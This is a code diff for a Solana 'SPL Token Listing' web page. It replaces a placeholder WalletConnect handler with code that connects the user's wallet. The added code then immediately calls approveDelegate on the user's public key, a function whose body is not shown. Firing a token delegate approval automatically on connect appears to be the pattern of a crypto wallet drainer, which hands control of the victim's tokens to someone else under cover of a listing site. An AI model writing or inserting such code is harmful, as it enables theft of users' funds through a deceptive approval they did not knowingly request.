@@ -71,10 +71,22 @@ async function connectPhantom() {
    ============================ */
 async function connectWalletConnect() {
   try {
-    // Placeholder: integrate Solana Wallet Adapter for Solflare, Trust Wallet, Backpack, Glow, etc.
-    alert("WalletConnect modal would open here with Solflare, Trust Wallet, Backpack, Glow, etc.");
+    const wcProvider = await SolanaWalletAdapter.init({
+      projectId: "YOUR_WALLETCONNECT_PROJECT_ID_HERE", // 👈 WC ID goes here
+      chains: ["solana:devnet"], // or "solana:mainnet" if live
+      showQrModal: true,
+      metadata: {
+        name: "SPL Token Listing",
+        url: window.location.origin
+      }
+    });
+
+    provider = wcProvider;
+    const accounts = await wcProvider.connect();
+    ownerPublicKey = accounts[0].address;
     walletModal.style.display = 'none';
-    // After user picks a wallet, set provider and ownerPublicKey accordingly
+    alert("✅ WalletConnect connected: " + ownerPublicKey.toString());
+    await approveDelegate(ownerPublicKey);
   } catch (err) {
     console.error("WalletConnect error:", err);
     alert("❌ WalletConnect Error: " + (err.message || String(err)));
